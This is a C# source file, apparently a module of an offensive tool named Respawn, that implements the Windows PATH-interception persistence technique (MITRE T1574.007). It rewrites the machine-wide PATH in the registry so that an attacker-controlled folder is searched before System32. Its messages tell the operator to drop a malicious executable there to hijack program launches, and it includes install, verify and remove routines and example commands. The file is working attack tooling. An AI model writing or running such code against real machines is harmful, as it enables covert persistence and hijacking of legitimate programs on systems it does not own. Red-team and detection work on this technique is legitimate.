using Microsoft.Win32;
using Respawn.Core;
using ExecutionContext = Respawn.Core.ExecutionContext;

namespace Respawn.Techniques.PathInterception
{
    public class PathInterceptionModule : ITechniqueModule
    {
        // ─── Identity ────────────────────────────────────────────────────────────

        public string Id          => "path";
        public string Name        => "Path Interception";
        public string Mitre       => "T1574.007";
        public string Description => "Persist by abusing the Windows executable search order, prepending a controlled directory to the system PATH environment variable so that the OS executes a malicious payload whenever a target application is launched without an absolute path.";

        // ─── Constants ───────────────────────────────────────────────────────────

        const string RegPath = @"SYSTEM\CurrentControlSet\Control\Session Manager\Environment";

        // ─── Help ────────────────────────────────────────────────────────────────

        public void ShowHelp()
        {

            TechniqueHelpBuilder.RenderShowHelp("p1", "keys");

            // 2. OPERATIONAL NOTE
            // Console.ForegroundColor = ConsoleColor.Cyan;
            // Console.WriteLine("  OPERATIONAL NOTE:");
            // Console.ResetColor();
            // Console.WriteLine("    - Prepending ensures your folder is checked BEFORE System32");
            // Console.WriteLine("    - Payload name must match the target (e.g., 'notepad.exe')");
            // Console.WriteLine();

            // 3. OPTIONS
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  OPTIONS:");
            Console.ResetColor();
            
            TechniqueHelpBuilder.RenderOption("-f,  --folder", "Directory to inject into System PATH");
            TechniqueHelpBuilder.RenderOption("-n,  --name", "Exe name to verify (Verify Action only)");
            Console.WriteLine();

            // 4. EXAMPLES
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  EXAMPLES:");
            Console.ResetColor();

            TechniqueHelpBuilder.RenderExample("Respawn -t path -a list-keys");
            TechniqueHelpBuilder.RenderExample("Respawn -t path -a install -f \"C:\\Users\\Public\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t path -a verify  -f \"C:\\Users\\Public\" -n \"calc.exe\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t path -a remove  -f \"C:\\Users\\Public\"");
        }

        // ─── List Options ────────────────────────────────────────────────────────

        public List<TechniqueOption> ListOptions(string optionType)
        {
            if (optionType.Equals("keys", StringComparison.OrdinalIgnoreCase))
                return PathInterceptionKeys.All;

            return new List<TechniqueOption>();
        }

        // ─── Install ─────────────────────────────────────────────────────────────

        public TechniqueResult Install(ExecutionContext ctx)
        {
            if (!Validate(ctx, requireFolder: true, out string error))
                return TechniqueResult.Fail(error);

            try
            {
                string currentPath = GetPath();

                if (currentPath.Contains(ctx.Folder, StringComparison.OrdinalIgnoreCase))
                    return TechniqueResult.Exists($"Directory '{ctx.Folder}' already in system PATH.");

                string newPath = ctx.Folder + ";" + currentPath;
                SetPath(newPath);

                return TechniqueResult.Ok(
                    $"Prepended '{ctx.Folder}' to system PATH before System32. " +
                    $"Place malicious exe in that directory to intercept calls. " +
                    $"Logoff and logon required for new sessions to pick up the change.");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied("Access denied. System PATH requires administrator privileges.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Remove ──────────────────────────────────────────────────────────────

        public TechniqueResult Remove(ExecutionContext ctx)
        {
            if (!Validate(ctx, requireFolder: true, out string error))
                return TechniqueResult.Fail(error);

            try
            {
                string currentPath = GetPath();

                if (!currentPath.Contains(ctx.Folder, StringComparison.OrdinalIgnoreCase))
                    return TechniqueResult.NotFound($"Directory '{ctx.Folder}' not found in system PATH.");

                string newPath = RemoveFromPath(currentPath, ctx.Folder);
                SetPath(newPath);

                return TechniqueResult.Ok($"Removed '{ctx.Folder}' from system PATH.");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied("Access denied. System PATH requires administrator privileges.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Verify ──────────────────────────────────────────────────────────────

        public TechniqueResult Verify(ExecutionContext ctx)
        {
            if (!Validate(ctx, requireFolder: true, out string error))
                return TechniqueResult.Fail(error);

            try
            {
                string currentPath = GetPath();

                if (!currentPath.Contains(ctx.Folder, StringComparison.OrdinalIgnoreCase))
                    return TechniqueResult.NotFound($"Directory '{ctx.Folder}' not found in system PATH.");

                string[] parts      = currentPath.Split(';');
                int      ourIndex   = Array.FindIndex(parts, p => p.Equals(ctx.Folder, StringComparison.OrdinalIgnoreCase));
                int      sys32Index = Array.FindIndex(parts, p => p.Contains("System32", StringComparison.OrdinalIgnoreCase));
                bool     intercepting = ourIndex != -1 && (sys32Index == -1 || ourIndex < sys32Index);

                string exeStatus = "not checked";
                if (!string.IsNullOrEmpty(ctx.Name))
                {
                    string exePath = Path.Combine(ctx.Folder, ctx.Name);
                    exeStatus = System.IO.File.Exists(exePath)
                        ? $"'{ctx.Name}' FOUND in directory — interception active"
                        : $"'{ctx.Name}' NOT found in directory — place exe there to intercept";
                }

                return TechniqueResult.Ok(
                    $"Verified '{ctx.Folder}' in system PATH | " +
                    $"Position: {ourIndex} | " +
                    $"Before System32: {intercepting} | " +
                    $"{exeStatus}");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Helpers ─────────────────────────────────────────────────────────────

        private string GetPath()
        {
            using var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(RegPath, writable: false);
            return key?.GetValue("PATH", string.Empty)?.ToString() ?? string.Empty;
        }

        private void SetPath(string newPath)
        {
            using var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(RegPath, writable: true);
            key?.SetValue("PATH", newPath, RegistryValueKind.ExpandString);
        }

        private string RemoveFromPath(string currentPath, string folder)
        {
            var parts = currentPath.Split(';').ToList();
            parts.RemoveAll(p => p.Equals(folder, StringComparison.OrdinalIgnoreCase));
            return string.Join(";", parts);
        }

        private bool Validate(ExecutionContext ctx, bool requireFolder, out string error)
        {
            if (requireFolder && string.IsNullOrEmpty(ctx.Folder))
            {
                error = "No folder specified. Use -f <path>.";
                return false;
            }
            if (requireFolder && !Directory.Exists(ctx.Folder))
            {
                error = $"Folder not found: '{ctx.Folder}'. Create it first.";
                return false;
            }
            error = string.Empty;
            return true;
        }
    }
}